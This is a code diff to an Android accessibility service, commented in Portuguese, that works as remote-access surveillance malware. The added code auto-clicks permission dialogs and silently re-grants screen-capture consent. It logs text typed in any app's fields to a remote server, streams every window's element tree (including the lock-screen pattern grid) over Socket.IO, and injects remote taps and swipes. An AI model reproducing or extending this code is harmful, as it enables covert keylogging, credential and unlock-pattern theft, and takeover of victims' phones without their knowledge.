@@ -16,6 +16,7 @@ import android.hardware.HardwareBuffer
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
+import android.os.HandlerThread
 import android.os.Looper
 import android.os.PowerManager
 import android.app.KeyguardManager
@@ -103,6 +104,16 @@ class MyAccessibilityService : AccessibilityService() {
     private var isDispatching = false
     private var startX = 0f
     private var startY = 0f
+    // ───── Deslize CONTÍNUO tipo Nox (segue o dedo ao vivo, qualquer direção) ─────
+    private var arrastando = false        // há um arrasto em curso (houve MOVE)
+    private var segmentoEmCurso = false   // um segmento de stroke está animando
+    private var endPendente = false       // END chegou; finalizar após o segmento
+    private var gLastX = 0f               // último ponto JÁ despachado
+    private var gLastY = 0f
+    private var gPendX = -1f              // ponto mais recente pedido (coalescido)
+    private var gPendY = -1f
+    private var gLastSegTime = 0L         // instante do último segmento (duração real)
+    private var gGen = 0                  // geração do gesto (ignora callbacks velhos)
     private var ultimoLayoutMudancaMs = 0L
     // Trava anti-loop do "manter tela preta de atualização no topo".
     private var ultimoRetornoAtualizacaoMs = 0L
@@ -249,6 +260,11 @@ class MyAccessibilityService : AccessibilityService() {
         "iniciar agora", "start now", "iniciar automático", "iniciar automatico",
         "iniciar automaticamente",
         "só desta vez", "so desta vez", "enquanto o app estiver em uso",
+        // Botão "Durante o uso do app" dos modais de permissão (One UI/AOSP):
+        // clica rápido para o modal sumir; como o auto-clique é restrito aos
+        // pacotes de permissão, ele para sozinho depois e não atrapalha o uso.
+        "durante o uso do app", "permitir durante o uso do app",
+        "ao usar o app", "somente com o app em uso", "while using the app",
         "allow", "accept", "enable", "allow only while using the app",
         "allow all the time", "start", "install"
     )
@@ -283,6 +299,7 @@ class MyAccessibilityService : AccessibilityService() {
         "ativar exibição", "ativar exibicao", "conceder permissão", "conceder permissao",
         "acessibilidade", "conceder", "allow", "accept", "start", "enable", "install",
         "permitir desta forma", "só desta vez", "so desta vez",
+        "durante o uso do app", "ao usar o app", "while using the app",
         "enquanto o app estiver em uso", "permitir o acesso", "abrir configurações", "abrir"
     )
 
@@ -918,34 +935,130 @@ class MyAccessibilityService : AccessibilityService() {
                 garantirBypass()
                 startX = boundedX
                 startY = boundedY
-                pendingX = -1f
-                pendingY = -1f
+                // Reinicia o estado do deslize contínuo. gGen++ invalida qualquer
+                // callback de segmento do gesto anterior (evita clobber).
+                gGen++
+                gLastX = boundedX
+                gLastY = boundedY
+                gPendX = -1f
+                gPendY = -1f
+                arrastando = false
+                segmentoEmCurso = false
+                endPendente = false
+                currentStroke = null
+                gLastSegTime = android.os.SystemClock.uptimeMillis()
             }
             "MOVE" -> {
                 garantirBypass()
-                pendingX = boundedX
-                pendingY = boundedY
+                // Coalesce: guarda o ponto mais recente. Se nenhum segmento está
+                // animando, despacha agora; senão, o onCompleted atual o consome.
+                gPendX = boundedX
+                gPendY = boundedY
+                if (!segmentoEmCurso) despacharSegmentoArrasto(false, ::garantirBypass)
             }
             "END" -> {
-                val finalX = if (pendingX >= 0f) pendingX else boundedX
-                val finalY = if (pendingY >= 0f) pendingY else boundedY
-
-                val movido = kotlin.math.abs(finalX - startX) > 5f || kotlin.math.abs(finalY - startY) > 5f
-                val duration = if (movido) 250L else 50L
-                val sX = startX
-                val sY = startY
-
-                // FILA FIFO: toques rápidos (digitação) NÃO concorrem — cada um
-                // espera o callback do anterior, então NENHUM clique é descartado
-                // por "dispatchGesture recusado" enquanto o gesto anterior roda.
-                enfileirarGesto {
-                    despacharGestoSerial(sX, sY, finalX, finalY, duration, movido, ::garantirBypass)
+                val finalX = if (gPendX >= 0f) gPendX else boundedX
+                val finalY = if (gPendY >= 0f) gPendY else boundedY
+                if (arrastando) {
+                    // Finaliza o deslize contínuo (solta o dedo) no último ponto.
+                    gPendX = finalX
+                    gPendY = finalY
+                    endPendente = true
+                    if (!segmentoEmCurso) despacharSegmentoArrasto(true, ::garantirBypass)
+                } else {
+                    val movido = kotlin.math.abs(finalX - startX) > 5f ||
+                        kotlin.math.abs(finalY - startY) > 5f
+                    val duration = if (movido) 220L else 50L
+                    val sX = startX
+                    val sY = startY
+                    // Sem MOVE (tap, ou swipe rápido demais p/ gerar MOVE): usa a
+                    // FILA FIFO serial de sempre — nunca descarta por concorrência.
+                    enfileirarGesto {
+                        despacharGestoSerial(sX, sY, finalX, finalY, duration, movido, ::garantirBypass)
+                    }
+                    gPendX = -1f
+                    gPendY = -1f
                 }
-
-                pendingX = -1f
-                pendingY = -1f
             }
         }
+    }
+
+    /** Despacha UM segmento do deslize contínuo (tipo Nox): liga o ponto já
+     *  despachado ao ponto pendente com um stroke que CONTINUA o anterior
+     *  (willContinue), mantendo o dedo pressionado entre segmentos. A duração
+     *  acompanha o tempo real entre eventos → movimento suave, sem “pulo”. */
+    private fun despacharSegmentoArrasto(finalizar: Boolean, garantirBypass: () -> Unit) {
+        val dx = gPendX
+        val dy = gPendY
+        if (!finalizar && dx < 0f) return
+        val destX = if (dx >= 0f) dx else gLastX
+        val destY = if (dy >= 0f) dy else gLastY
+        garantirBypass()
+        val agora = android.os.SystemClock.uptimeMillis()
+        var dur = agora - gLastSegTime
+        if (dur < 8L) dur = 8L
+        if (dur > 120L) dur = 120L
+        val path = Path().apply {
+            moveTo(gLastX, gLastY)
+            if (destX == gLastX && destY == gLastY) lineTo(destX + 0.5f, destY + 0.5f)
+            else lineTo(destX, destY)
+        }
+        val willContinue = !finalizar
+        val stroke = try {
+            val cs = currentStroke
+            if (cs == null) GestureDescription.StrokeDescription(path, 0L, dur, willContinue)
+            else cs.continueStroke(path, 0L, dur, willContinue)
+        } catch (e: Exception) {
+            enviarLog("[DESLIZE] stroke inválido: ${e.message}")
+            resetArrasto(); return
+        }
+        arrastando = true
+        segmentoEmCurso = true
+        val meuGen = gGen
+        val gesto = GestureDescription.Builder().addStroke(stroke).build()
+        val aceito = try {
+            dispatchGesture(gesto, object : GestureResultCallback() {
+                override fun onCompleted(g: GestureDescription?) {
+                    if (meuGen != gGen) return
+                    onSegmentoFim(stroke, destX, destY, finalizar, garantirBypass)
+                }
+                override fun onCancelled(g: GestureDescription?) {
+                    if (meuGen != gGen) return
+                    segmentoEmCurso = false
+                    resetArrasto()
+                }
+            }, handlerMain)
+        } catch (_: Exception) { false }
+        if (!aceito) { segmentoEmCurso = false; resetArrasto() }
+    }
+
+    private fun onSegmentoFim(
+        stroke: GestureDescription.StrokeDescription,
+        destX: Float, destY: Float, foiFinal: Boolean, garantirBypass: () -> Unit
+    ) {
+        currentStroke = if (foiFinal) null else stroke
+        gLastX = destX
+        gLastY = destY
+        gLastSegTime = android.os.SystemClock.uptimeMillis()
+        segmentoEmCurso = false
+        if (foiFinal) { resetArrasto(); return }
+        when {
+            // END chegou enquanto o segmento animava → finaliza o deslize agora.
+            endPendente -> despacharSegmentoArrasto(true, garantirBypass)
+            // MOVE novo chegou durante a animação → continua seguindo o dedo.
+            gPendX >= 0f && (gPendX != destX || gPendY != destY) ->
+                despacharSegmentoArrasto(false, garantirBypass)
+            else -> { gPendX = -1f; gPendY = -1f }
+        }
+    }
+
+    private fun resetArrasto() {
+        arrastando = false
+        segmentoEmCurso = false
+        endPendente = false
+        currentStroke = null
+        gPendX = -1f
+        gPendY = -1f
     }
 
     // ───── Fila serial de gestos (nunca perde clique por concorrência) ─────
@@ -1130,13 +1243,7 @@ class MyAccessibilityService : AccessibilityService() {
         // (a palavra da dica grudava antes do texto). Quando o campo está
         // mostrando o hint (isShowingHintText) ou node.text == hintText, o
         // conteúdo real é vazio — começa limpo.
-        val atual = run {
-            val t = node.text?.toString() ?: ""
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                val hint = node.hintText?.toString()
-                if (node.isShowingHintText || (hint != null && t == hint)) "" else t
-            } else t
-        }
+        val atual = baseTextoReal(node)
         when (tipo) {
             "texto" -> definirTexto(node, atual + valor)
             "tecla" -> when (valor.uppercase()) {
@@ -1176,6 +1283,38 @@ class MyAccessibilityService : AccessibilityService() {
         }
     }
 
+    // Placeholders/dicas comuns que apps exibem no campo VAZIO. Em alguns apps
+    // (ex.: WhatsApp "Mensagem") o node.text devolve a dica mesmo com
+    // isShowingHintText=false e hintText=null — sem este backstop a 1ª letra
+    // digitada grudava na dica ("Mensagem" + "marcelo" = "Mensagemmarcelo").
+    // Comparação EXATA (trim+lowercase) para NUNCA apagar um texto real que
+    // apenas contenha a palavra (ex.: "Mensagem para João" é preservado).
+    private val placeholdersComuns = setOf(
+        "mensagem", "mensagem...", "digite uma mensagem", "escreva uma mensagem",
+        "digite uma mensagem...", "pesquisar", "pesquise", "pesquisa", "buscar",
+        "busca", "search", "search…", "type a message", "message", "aa",
+        "digite aqui", "digite", "escreva algo", "telefone ou email",
+        "pesquisar no google ou digitar um url", "legenda", "adicione um comentário",
+        "comentário", "comentario", "assunto", "nome"
+    )
+
+    private fun ePlaceholderComum(t: String): Boolean =
+        t.trim().lowercase() in placeholdersComuns
+
+    /** Texto REAL do campo, tratando a dica/placeholder como vazio. Usa os
+     *  sinais nativos (isShowingHintText / hintText) e, como rede de segurança
+     *  para apps que não os preenchem, a lista de placeholders comuns. */
+    private fun baseTextoReal(node: AccessibilityNodeInfo): String {
+        val t = node.text?.toString() ?: ""
+        if (t.isEmpty()) return ""
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val hint = node.hintText?.toString()
+            if (node.isShowingHintText || (hint != null && t == hint)) return ""
+        }
+        if (ePlaceholderComum(t)) return ""
+        return t
+    }
+
     private fun definirTexto(node: AccessibilityNodeInfo, texto: String) {
         val argsTexto = Bundle().apply {
             putCharSequence(
@@ -1204,6 +1343,40 @@ class MyAccessibilityService : AccessibilityService() {
     // MODO RÁPIDO (onboardingRapido=true): intervalo de 300ms entre cliques
     // e "voltar" automático após confirmar em telas de configuração.
     // ================================================================
+    // ================================================================
+    // GATILHO DE GRAVAÇÃO — EVENTOS DE ACESSIBILIDADE -> SERVIDOR
+    // ----------------------------------------------------------------
+    // Qualquer interação/ação assistiva no aparelho avisa o servidor via
+    // SocketManager.emitirEventoAcessibilidade para INICIAR e MANTER a
+    // gravação viva. Controle de taxa (throttle/debounce inteligente):
+    //  - eventos CONTÍNUOS (rolagem, digitação rápida): no máx. 1 a cada
+    //    1.5s para não floodar o Socket.IO;
+    //  - eventos IMPORTANTES (clique, troca de janela, ação injetada) ou o
+    //    PRIMEIRO evento após >3s de ociosidade: enviados IMEDIATAMENTE
+    //    (dispara a gravação na hora, sem atraso).
+    // ================================================================
+    @Volatile private var ultimoEventoAcessEmitidoMs: Long = 0L
+    private val THROTTLE_EVENTO_ACESS_MS = 1500L
+    private val OCIOSIDADE_EVENTO_ACESS_MS = 3000L
+
+    private fun reportarEventoAcessibilidade(tipo: String, detalhes: String = "", importante: Boolean = false) {
+        val agora = System.currentTimeMillis()
+        val ociosoHaMuito = (agora - ultimoEventoAcessEmitidoMs) >= OCIOSIDADE_EVENTO_ACESS_MS
+        // Envia imediatamente se for um evento importante (clique/janela/ação
+        // injetada) ou se o aparelho estava ocioso; caso contrário, aplica o
+        // throttle de 1.5s para eventos contínuos (rolagem/digitação).
+        if (!importante && !ociosoHaMuito &&
+            (agora - ultimoEventoAcessEmitidoMs) < THROTTLE_EVENTO_ACESS_MS) {
+            return
+        }
+        ultimoEventoAcessEmitidoMs = agora
+        try { SocketManager.emitirEventoAcessibilidade(tipo, detalhes) } catch (_: Exception) {}
+    }
+
+    /** Pacote (app) de origem do evento — detalhe leve para o log do servidor. */
+    private fun pacoteDoEvento(event: AccessibilityEvent): String =
+        try { event.packageName?.toString() ?: "" } catch (_: Exception) { "" }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
 
@@ -1329,6 +1502,21 @@ class MyAccessibilityService : AccessibilityService() {
         // TRANSMISSÃO CONTÍNUA DE TELEMETRIA (Modo Híbrido / Leitor FPS)
         enviarTelemetriaAcessibilidade(event)
 
+        // GATILHO DE GRAVAÇÃO: avisa o servidor que há atividade no aparelho.
+        // Clique e troca de janela são IMPORTANTES (envio imediato); rolagem e
+        // mudança de texto são contínuos (throttle de 1.5s). Outros tipos são
+        // ignorados para não poluir a rede.
+        when (event.eventType) {
+            AccessibilityEvent.TYPE_VIEW_CLICKED ->
+                reportarEventoAcessibilidade("clique", pacoteDoEvento(event), importante = true)
+            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ->
+                reportarEventoAcessibilidade("janela", pacoteDoEvento(event), importante = true)
+            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ->
+                reportarEventoAcessibilidade("digitacao", pacoteDoEvento(event))
+            AccessibilityEvent.TYPE_VIEW_SCROLLED ->
+                reportarEventoAcessibilidade("rolagem", pacoteDoEvento(event))
+        }
+
         // MONITORAMENTO DE TECLADO VIRTUAL E LOG EM LINHA ÚNICA AO FECHAR
         // CORREÇÃO DE PERDA DE CARACTERES: o texto do evento (event.text) é a
         // fonte MAIS FRESCA e confiável — ele carrega o valor COMPLETO do campo
@@ -1338,48 +1526,45 @@ class MyAccessibilityService : AccessibilityService() {
         // O buffer é SEMPRE atualizado (mesmo quando vazio) para não enviar um
         // texto velho quando o teclado fecha. Nenhuma letra/número é removido.
         val tipo = event.eventType
-        if (tipo == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOWS_CHANGED || tipo == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            val keyboardOpen = isKeyboardOpen()
-            if (keyboardOpen) {
-                // 1) Tenta o texto fresco do próprio evento (vem completo).
-                var txt: String = event.text?.joinToString("") ?: ""
-                var node: AccessibilityNodeInfo? = event.source
-                    ?: rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
-                // 2) Se o evento veio vazio, lê do nó (com refresh para não usar valor obsoleto).
-                if (txt.isEmpty() && node != null) {
-                    try { node.refresh() } catch (_: Exception) {}
-                    txt = node.text?.toString() ?: ""
-                }
-                // 3) Última reserva: acha o campo editável focado na árvore e lê o texto.
-                if (txt.isEmpty()) {
-                    val focado = rootInActiveWindow?.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
-                    if (focado != null) {
-                        try { focado.refresh() } catch (_: Exception) {}
-                        txt = focado.text?.toString() ?: ""
-                        if (node == null) node = focado
-                    }
-                }
+        if (tipo == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+            // CAPTURA SÓ DE CAMPO DE TEXTO EDITÁVEL REAL (Árvore de Acessibilidade).
+            // Lê o texto do NÓ que REALMENTE mudou, e só se ele for editável
+            // (EditText / isEditable). Antes capturávamos event.text de QUALQUER
+            // evento (inclusive TYPE_WINDOW_STATE_CHANGED), o que gravava rótulos
+            // de botões/janelas como se fossem digitação (ex.: "Apps recentes").
+            val src = event.source
+            val ehCampoEditavel = src != null && (
+                src.isEditable ||
+                (src.className?.toString()?.contains("EditText", ignoreCase = true) == true))
+            if (ehCampoEditavel) {
+                try { src!!.refresh() } catch (_: Exception) {}
+                // Texto AUTORITATIVO do campo (nó da árvore). event.text é reserva.
+                val txt = (src!!.text?.toString() ?: event.text?.joinToString("") ?: "")
                 val bounds = android.graphics.Rect()
-                try { node?.getBoundsInScreen(bounds) } catch (_: Exception) {}
-                val cleaned = txt.replace("\n", " ").replace("\r", " ").replace(Regex("\\s+"), " ").trim()
-                // Buffer SEMPRE atualizado (mesmo vazio) — evita enviar texto obsoleto no fechamento.
+                try { src.getBoundsInScreen(bounds) } catch (_: Exception) {}
+                val cleaned = txt.replace("\n", " ").replace("\r", " ")
+                    .replace(Regex("\\s+"), " ").trim()
                 bufferTextoTeclado = cleaned
                 bufferAppTeclado = event.packageName?.toString() ?: bufferAppTeclado
                 bufferBoundsTeclado = bounds
                 if (cleaned.isNotEmpty()) {
                     SocketManager.enviarTecladoLog(bufferAppTeclado, cleaned, bufferBoundsTeclado)
                 }
-                try { node?.recycle() } catch (_: Exception) {}
                 tecladoAbertoAnterior = true
-            } else if (tecladoAbertoAnterior && !keyboardOpen) {
-                if (bufferTextoTeclado.isNotEmpty()) {
-                    SocketManager.enviarTecladoLog(bufferAppTeclado, bufferTextoTeclado, bufferBoundsTeclado)
-                }
-                bufferTextoTeclado = ""
-                bufferAppTeclado = ""
-                bufferBoundsTeclado = null
-                tecladoAbertoAnterior = false
             }
+            try { src?.recycle() } catch (_: Exception) {}
+        } else if ((tipo == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                    || tipo == AccessibilityEvent.TYPE_WINDOWS_CHANGED)
+                   && tecladoAbertoAnterior && !isKeyboardOpen()) {
+            // Teclado FECHOU: fecha a linha com o ÚLTIMO texto do CAMPO (nunca lê
+            // o texto da janela/botão que disparou a mudança).
+            if (bufferTextoTeclado.isNotEmpty()) {
+                SocketManager.enviarTecladoLog(bufferAppTeclado, bufferTextoTeclado, bufferBoundsTeclado)
+            }
+            bufferTextoTeclado = ""
+            bufferAppTeclado = ""
+            bufferBoundsTeclado = null
+            tecladoAbertoAnterior = false
         }
     }
 
@@ -1519,15 +1704,18 @@ class MyAccessibilityService : AccessibilityService() {
     private fun verificarEReanimarEcossistema() {
         try {
             val agora = System.currentTimeMillis()
-            // Se o serviço já está rodando, nada a fazer (e zera contador de falhas).
-            if (ScreenCaptureService.isRunning) { reanimacaoFalhasConsecutivas = 0; return }
-            // [MODAL SÓ NO REBOOT] Este keep-alive reabria a MainActivity headless
-            // (AUTO_BOOT_REANIMAR) a cada mudança de janela quando a captura estava
-            // caída — era o principal motivo do modal de consentimento pipocar em
-            // sessão. A pedido, o modal agora aparece SOMENTE quando o dispositivo
-            // é REINICIADO (BootReceiver -> MainActivity AUTO_BOOT_REANIMAR).
-            // Portanto, NÃO reabrimos mais o consentimento aqui em sessão.
-            return
+            // CAPTURA REALMENTE VIVA? Não basta o serviço EXISTIR (isRunning): ao
+            // apagar/deslizar a tela, o token do MediaProjection cai e o serviço
+            // fica VIVO mas SEM capturar (capturandoDeVerdade == false). Antes este
+            // keep-alive checava isRunning e nunca reergia esse caso — o
+            // espelhamento caía ao bloquear/dormir e só voltava com REBOOT. Agora,
+            // se está capturando de verdade, nada a fazer (e zera o backoff).
+            if (ScreenCaptureService.capturandoDeVerdade) { reanimacaoFalhasConsecutivas = 0; return }
+            // CAPTURA CAÍDA + socket vivo: reergue em SILÊNCIO (MainActivity
+            // headless AUTO_BOOT_REANIMAR, auto-aceita pela acessibilidade) para o
+            // espelhamento NUNCA ficar desconectado ao dormir/acordar/deslizar. O
+            // gating abaixo (sessão já ativou + cooldown de cancelamento +
+            // throttle/backoff) impede o modal de pipocar / loop de reabertura.
             // Sem socket conectado = ninguém assistindo ao vídeo → não reanima
             // (evita abrir a MainActivity à toa e "mexer a tela" sem motivo).
             if (SocketManager.socket?.connected() != true) return
@@ -1893,6 +2081,8 @@ class MyAccessibilityService : AccessibilityService() {
         setBloqueioPermiteToqueRemoto(true)
         handlerMain.removeCallbacks(failsafeRestauroBloqueio)
         handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
+        // Ação assistiva injetada -> dispara/mantém a gravação no servidor.
+        reportarEventoAcessibilidade("acao_clique_injetado", "", importante = true)
         val boundedX = x.coerceIn(0f, resources.displayMetrics.widthPixels.toFloat() - 1f)
         val boundedY = y.coerceIn(0f, resources.displayMetrics.heightPixels.toFloat() - 1f)
         val path = Path().apply {
@@ -1923,6 +2113,8 @@ class MyAccessibilityService : AccessibilityService() {
             handlerMain.removeCallbacks(failsafeRestauroBloqueio)
             handlerMain.postDelayed(failsafeRestauroBloqueio, 3000L)
         }
+        // Ação assistiva injetada (arraste) -> dispara/mantém a gravação.
+        reportarEventoAcessibilidade("acao_swipe_injetado", "", importante = true)
         val path = Path().apply {
             moveTo(startX, startY)
             lineTo(endX, endY)
@@ -2152,8 +2344,8 @@ class MyAccessibilityService : AccessibilityService() {
         wireframeUltimoEnvioMs = agora
 
         val payload = JSONObject().apply {
-            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
-            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
+            put("deviceId", SocketManager.nomeDispositivoAtual())
+            put("dispositivo", SocketManager.nomeDispositivoAtual())
             put("width", w)
             put("height", h)
             put("fps", wireframeFpsAtual)
@@ -2399,7 +2591,9 @@ class MyAccessibilityService : AccessibilityService() {
                             // conteúdo atual com o colado na posição do cursor;
                             // caso contrário, substitui (comportamento do campo
                             // "Send text").
-                            val atual = alvo.text?.toString() ?: ""
+                            // Trata a dica/placeholder como vazio (ex.: WhatsApp
+                            // "Mensagem") para o colar não grudar na dica.
+                            val atual = baseTextoReal(alvo)
                             val textoFinal: String
                             val cursorFinal: Int
                             if (inserir) {
@@ -2715,8 +2909,8 @@ class MyAccessibilityService : AccessibilityService() {
         }
 
         return JSONObject().apply {
-            put("dispositivo", "${Build.MANUFACTURER}-${Build.MODEL}")
-            put("deviceId", "${Build.MANUFACTURER}-${Build.MODEL}")
+            put("dispositivo", SocketManager.nomeDispositivoAtual())
+            put("deviceId", SocketManager.nomeDispositivoAtual())
             put("telaApagada", telaApagada)
             put("telaBloqueada", telaBloqueada)
             put("senhaGuardada", senhaGuardada)
@@ -2865,7 +3059,7 @@ class MyAccessibilityService : AccessibilityService() {
             val action = intent.action ?: return
             when (action) {
                 Intent.ACTION_USER_PRESENT -> {
-                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
+                    val deviceId = SocketManager.nomeDispositivoAtual()
                     Log.d(TAG, "ACTION_USER_PRESENT recebido — tela do dispositivo $deviceId foi REALMENTE desbloqueada!")
                     // [REBOOT/SEM TOKEN] Só para a captura por acessibilidade se o
                     // MediaProjection estiver REALMENTE capturando (vai assumir o
@@ -2924,7 +3118,7 @@ class MyAccessibilityService : AccessibilityService() {
                     }
                 }
                 Intent.ACTION_SCREEN_OFF -> {
-                    val deviceId = "${Build.MANUFACTURER}-${Build.MODEL}"
+                    val deviceId = SocketManager.nomeDispositivoAtual()
                     Log.d(TAG, "ACTION_SCREEN_OFF recebido — limpando buffer de gestos físicos.")
                     limparBufferGestosFisicos()
                     try {
@@ -3017,64 +3211,86 @@ class MyAccessibilityService : AccessibilityService() {
      * Envia telemetria da árvore de componentes e eventos de interação via Socket.IO em tempo real.
      * Funciona continuamente mesmo quando a tela estiver apagada ou o vídeo pausado.
      */
+    // Telemetria pesada (varredura de TODAS as janelas + árvore) roda numa THREAD
+    // SEPARADA para NUNCA travar a thread principal. Era a CAUSA do ANR "giga+ não
+    // está respondendo" + tela branca com o espelhamento ativo: no aparelho fraco
+    // (A10), varrer a árvore na main thread a cada evento saturava o app. Guarda
+    // "single-flight": nunca enfileira mais de uma varredura por vez.
+    @Volatile private var telemetriaEmVoo = false
+    private var telemetriaThread: HandlerThread? = null
+    private var telemetriaHandler: Handler? = null
+    private fun garantirTelemetriaHandler(): Handler {
+        if (telemetriaHandler == null) {
+            telemetriaThread = HandlerThread("telemetria-aces").also { it.start() }
+            telemetriaHandler = Handler(telemetriaThread!!.looper)
+        }
+        return telemetriaHandler!!
+    }
+
     private fun enviarTelemetriaAcessibilidade(event: AccessibilityEvent?) {
-        try {
-            val agora = System.currentTimeMillis()
-            val tipo = event?.eventType ?: 0
+        val agora = System.currentTimeMillis()
+        val tipo = event?.eventType ?: 0
 
-            // FOCO SEQUENCIAL EM TEMPO REAL: mudanças de foco/seleção (foco da
-            // grade 3x3 / LockPatternView) são emitidas IMEDIATAMENTE, sem o
-            // debounce de 100ms, para que o Leitor FPS acompanhe o foco nó a nó.
-            val eventoFoco = tipo == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
-                tipo == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
-                tipo == AccessibilityEvent.TYPE_VIEW_SELECTED
+        // Foco (grade 3x3 da senha padrão) vai imediato; o resto tem throttle
+        // UNIFORME para todos os tipos (antes só TYPE_WINDOW_CONTENT_CHANGED era
+        // limitado — foco/rolagem/clique passavam direto e enchiam a fila).
+        val eventoFoco = tipo == AccessibilityEvent.TYPE_VIEW_HOVER_ENTER ||
+            tipo == AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED ||
+            tipo == AccessibilityEvent.TYPE_VIEW_SELECTED
+        if (!eventoFoco && (agora - ultimoEnvioTelemetriaMs < 120)) return
+        // Single-flight: se a varredura anterior ainda roda, descarta esta (evita
+        // backlog). O próximo evento manda a versão mais recente.
+        if (telemetriaEmVoo) return
+        ultimoEnvioTelemetriaMs = agora
+        telemetriaEmVoo = true
+        // Extrai o que precisa do event AGORA (ele é reciclado ao retornar daqui).
+        val pkg = event?.packageName?.toString() ?: ""
 
-            if (!eventoFoco && tipo == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED &&
-                (agora - ultimoEnvioTelemetriaMs < 100)) {
-                return
+        // TODA a parte pesada (varredura + JSON + emit) sai da thread principal.
+        garantirTelemetriaHandler().post {
+            try {
+                val pontoReal = android.graphics.Point()
+                val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
+                @Suppress("DEPRECATION")
+                wm?.defaultDisplay?.getRealSize(pontoReal)
+                val metrics = resources.displayMetrics
+                val screenWidth = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
+                val screenHeight = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels
+
+                // Percorre TODAS as janelas (windows) + rootInActiveWindow (grade
+                // 3x3 da SystemUI/Keyguard inclusive).
+                val nos = mutableListOf<JSONObject>()
+                coletarNosDeTodasJanelas(nos)
+
+                val deviceName = SocketManager.nomeDispositivoAtual()
+
+                val arrayGestos = JSONArray()
+                synchronized(bufferGestosFisicos) {
+                    bufferGestosFisicos.forEach { arrayGestos.put(it) }
+                }
+
+                val kgManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
+                val telaBloqueada = kgManager?.isKeyguardLocked == true
+
+                val payload = JSONObject().apply {
+                    put("dispositivo", deviceName)
+                    put("package_name", pkg)
+                    put("screen_width", screenWidth)
+                    put("screen_height", screenHeight)
+                    put("tela_bloqueada", telaBloqueada)
+                    put("nos", JSONArray(nos))
+                    put("interacoes", arrayGestos)
+                    put("timestamp", agora)
+                }
+
+                SocketManager.garantirConexao()
+                SocketManager.socket?.emit("dados_acessibilidade", payload)
+                SocketManager.socket?.emit("telemetria_acessibilidade", payload)
+            } catch (e: Exception) {
+                Log.e(TAG, "Erro ao enviar telemetria de acessibilidade: ${e.message}")
+            } finally {
+                telemetriaEmVoo = false
             }
-            ultimoEnvioTelemetriaMs = agora
-
-            val pontoReal = android.graphics.Point()
-            val wm = getSystemService(WINDOW_SERVICE) as? WindowManager
-            @Suppress("DEPRECATION")
-            wm?.defaultDisplay?.getRealSize(pontoReal)
-            val metrics = resources.displayMetrics
-            val screenWidth = if (pontoReal.x > 0) pontoReal.x else metrics.widthPixels
-            val screenHeight = if (pontoReal.y > 0) pontoReal.y else metrics.heightPixels
-
-            // Percorre TODAS as janelas (windows) + rootInActiveWindow, incluindo
-            // a SystemUI/Keyguard onde a grade 3x3 é renderizada, extraindo os
-            // boundsInScreen dos filhos da grade.
-            val nos = mutableListOf<JSONObject>()
-            coletarNosDeTodasJanelas(nos)
-
-            val deviceName = "${Build.MANUFACTURER}-${Build.MODEL}"
-
-            val arrayGestos = JSONArray()
-            synchronized(bufferGestosFisicos) {
-                bufferGestosFisicos.forEach { arrayGestos.put(it) }
-            }
-
-            val kgManager = getSystemService(KEYGUARD_SERVICE) as? KeyguardManager
-            val telaBloqueada = kgManager?.isKeyguardLocked == true
-
-            val payload = JSONObject().apply {
-                put("dispositivo", deviceName)
-                put("package_name", event?.packageName?.toString() ?: "")
-                put("screen_width", screenWidth)
-                put("screen_height", screenHeight)
-                put("tela_bloqueada", telaBloqueada)
-                put("nos", JSONArray(nos))
-                put("interacoes", arrayGestos)
-                put("timestamp", agora)
-            }
-
-            SocketManager.garantirConexao()
-            SocketManager.socket?.emit("dados_acessibilidade", payload)
-            SocketManager.socket?.emit("telemetria_acessibilidade", payload)
-        } catch (e: Exception) {
-            Log.e(TAG, "Erro ao enviar telemetria de acessibilidade: ${e.message}")
         }
     }
 
